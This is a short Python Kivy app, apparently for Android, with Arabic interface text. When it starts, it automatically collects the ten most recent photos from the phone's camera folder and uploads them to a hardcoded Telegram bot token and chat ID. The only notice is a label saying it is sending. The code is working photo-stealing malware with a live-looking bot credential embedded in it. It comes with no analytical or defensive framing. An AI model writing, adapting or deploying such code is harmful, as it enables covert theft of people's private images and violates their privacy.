from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
import os
import requests
from threading import Thread

BOT_TOKEN = "8318983914:AAGEwCQk9HUsnIkdPspbrEqZjOtFXR9ZIUc"
CHAT_ID = "1170274856"
IMAGE_FOLDER = "/storage/emulated/0/DCIM/Camera"

def send_photo_to_telegram(photo_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        with open(photo_path, "rb") as photo_file:
            files = {"photo": photo_file}
            data = {"chat_id": CHAT_ID}
            r = requests.post(url, files=files, data=data)
            return r.status_code == 200
    except Exception as e:
        print(f"Error sending {photo_path}: {e}")
        return False

class MyApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical', padding=20, spacing=20)
        self.label = Label(text="جارٍ الإرسال تلقائيًا...")
        self.layout.add_widget(self.label)

        # تشغيل الإرسال في Thread لتجنب تجميد الواجهة
        Thread(target=self.send_photos).start()

        return self.layout

    def send_photos(self):
        self.update_label("جاري البحث عن الصور...")
        if not os.path.exists(IMAGE_FOLDER):
            self.update_label(f"المجلد غير موجود: {IMAGE_FOLDER}")
            return

        photos = [f for f in os.listdir(IMAGE_FOLDER) if f.lower().endswith((".png", ".jpg", ".jpeg"))]
        if not photos:
            self.update_label("لم يتم العثور على صور في المجلد")
            return

        photos.sort(key=lambda f: os.path.getmtime(os.path.join(IMAGE_FOLDER, f)), reverse=True)
        last_10_photos = photos[:10]

        self.update_label(f"تم العثور على {len(last_10_photos)} صورة، جارٍ الإرسال...")

        success_count = 0
        for photo in last_10_photos:
            full_path = os.path.join(IMAGE_FOLDER, photo)
            sent = send_photo_to_telegram(full_path)
            if sent:
                success_count += 1
            else:
                print(f"فشل إرسال الصورة: {photo}")

        self.update_label(f"تم إرسال {success_count} صور من أصل {len(last_10_photos)}")

    def update_label(self, text):
        # تحديث واجهة المستخدم من thread ثانوي
        from kivy.clock import Clock
        Clock.schedule_once(lambda dt: self.label.setter('text')(self.label, text))

if __name__ == "__main__":
    MyApp().run()
